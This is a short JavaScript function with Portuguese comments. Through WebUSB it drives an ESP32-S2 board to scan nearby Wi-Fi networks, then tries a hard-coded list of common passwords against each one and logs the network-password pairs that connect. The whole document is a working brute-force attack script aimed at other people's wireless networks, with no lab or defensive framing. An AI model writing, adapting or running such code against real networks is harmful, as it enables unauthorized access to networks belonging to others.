async function scanNetworks() {
    const log = document.getElementById('log');
    log.innerHTML = 'Escalando...\n';

    // Caso use ESP32-S2 via WebUSB
    try {
        const device = await navigator.usb.requestDevice({ filters: [{ vendorId: 0x303a }] });
        await device.open();
        await device.selectConfiguration(1);
        await device.claimInterface(0);

        // Envia comando para dump de redes
        await device.transferOut(1, new TextEncoder().encode("SCAN"));
const result = await device.transferIn(1, 64);
        const networks = new TextDecoder().decode(result.data);

        // Tentativa de brute-force
        const passwords = ['12345678','admin','123456789','00000000'];
        for (const net of networks.split('\n').filter(n => n)) {
            for (const pw of passwords) {
                await device.transferOut(1, new TextEncoder().encode(`CONNECT ${net}:${pw}`));
                const res = await device.transferIn(1, 64);
                if (new TextDecoder().decode(res.data).includes('SUCCESS')) {
                    log.innerHTML += `[+] ${net} -> ${pw}\n`;
                    break;
                }
            }
        }
        log.innerHTML += 'Concluído.';
    } catch (e) {
        log.innerHTML = 'Erro: ' + e.message;
    }
}
